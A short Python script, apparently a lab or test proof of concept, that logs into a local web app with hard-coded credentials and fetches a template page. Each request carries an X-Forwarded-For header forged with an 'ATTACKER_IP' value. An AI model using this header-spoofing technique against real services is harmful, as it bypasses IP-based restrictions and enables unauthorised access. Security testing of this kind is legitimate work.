import requests

BASE_URL = "http://127.0.0.1:5004"

URL_LOGIN = f"{BASE_URL}/login"
URL_TEMPLATE = f"{BASE_URL}/template/2"

USERNAME = "user1"
PASSWORD = "1234"
ATTACKER_IP = "10.15.15.19"

session = requests.Session()

headers = {
    "X-Forwarded-For": ATTACKER_IP
}

data_login = {
    "username": USERNAME,
    "password": PASSWORD
}

r_login = session.post(URL_LOGIN, data=data_login, headers=headers)

print("Login status:", r_login.status_code)


r_template= session.get(URL_TEMPLATE, headers=headers)

print("Template status:", r_template.status_code)
print("Template content:", r_template.text)
